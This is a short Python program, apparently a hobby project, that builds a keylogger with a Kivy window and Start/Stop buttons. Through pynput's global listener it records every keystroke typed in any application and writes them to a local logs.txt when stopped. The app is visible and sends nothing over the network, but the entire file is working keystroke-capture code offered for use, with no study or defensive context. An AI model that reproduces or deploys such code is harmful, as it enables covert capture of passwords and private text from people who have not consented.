# Keylogger-using-Kivy

from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.uix.label import Label
from pynput import keyboard


class Keylogger:
    def __init__(self):
        self.key_list = []
        self.is_logging = False
        self.listener = None

    def start_keylogger(self):
        self.is_logging = True
        self.log_status('Keylogger started...')

        def on_press(key):
            if self.is_logging:
                self.key_list.append(str(key))

        def on_release(key):
            if key == keyboard.Key.esc:
                self.stop_keylogger()
                return False

        self.listener = keyboard.Listener(on_press=on_press, on_release=on_release)
        self.listener.start()

    def stop_keylogger(self):
        self.is_logging = False
        self.log_status('Keylogger stopped...')

        self.listener.stop()
        self.listener.join()

        with open('logs.txt', 'w') as log_file:
            log_file.write('\n'.join(self.key_list))

        self.key_list = []

    def log_status(self, message):
        print(message)  # Update status in console or use a separate label in the UI


class KeyloggerApp(App):
    def build(self):
        self.keylogger = Keylogger()

        layout = BoxLayout(orientation='vertical', spacing=10)

        self.status_label = Label(text='Keylogger is idle', size_hint=(1, 0.2))
        layout.add_widget(self.status_label)

        self.start_button = Button(text='Start Keylogger', size_hint=(1, 0.4))
        self.start_button.bind(on_press=self.start_keylogger)
        layout.add_widget(self.start_button)

        self.stop_button = Button(text='Stop Keylogger', size_hint=(1, 0.4))
        self.stop_button.bind(on_press=self.stop_keylogger)
        self.stop_button.disabled = True
        layout.add_widget(self.stop_button)

        return layout

    def start_keylogger(self, instance):
        self.start_button.disabled = True
        self.stop_button.disabled = False
        self.keylogger.start_keylogger()
        self.status_label.text = 'Keylogger is active...'

    def stop_keylogger(self, instance):
        self.start_button.disabled = False
        self.stop_button.disabled = True
        self.keylogger.stop_keylogger()
        self.status_label.text = 'Keylogger has been stopped.'


if __name__ == '__main__':
    KeyloggerApp().run()
